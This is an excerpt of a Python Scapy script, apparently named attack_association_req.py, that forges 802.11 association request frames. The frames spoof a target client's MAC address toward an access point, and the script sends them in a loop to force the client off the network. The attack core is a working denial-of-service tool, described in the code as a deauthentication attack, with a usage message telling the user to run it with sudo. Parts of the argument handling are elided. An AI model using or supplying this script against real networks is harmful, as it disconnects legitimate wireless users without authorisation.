...
def action(iface: str, count: int, bssid: str, target_mac: str, ssid: str):
    ...
    dot11 = Dot11(type=0, subtype=0, addr1=bssid, addr2=target_mac, addr3=bssid)
    frame = RadioTap()/dot11/Dot11AssoReq(cap=0x0431, listen_interval=0x001e)/Dot11Elt(ID='SSID', info=ssid)
    sendp(frame, iface=iface, count=count, inter=0.100)

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a supplicant using spoofed association request frames")
    ...
    if (not args.interface or not args.count 
        ...
        print("[-] Please specify all program arguments... run `sudo python3 attack_association_req.py -h` for help")
        exit(1)
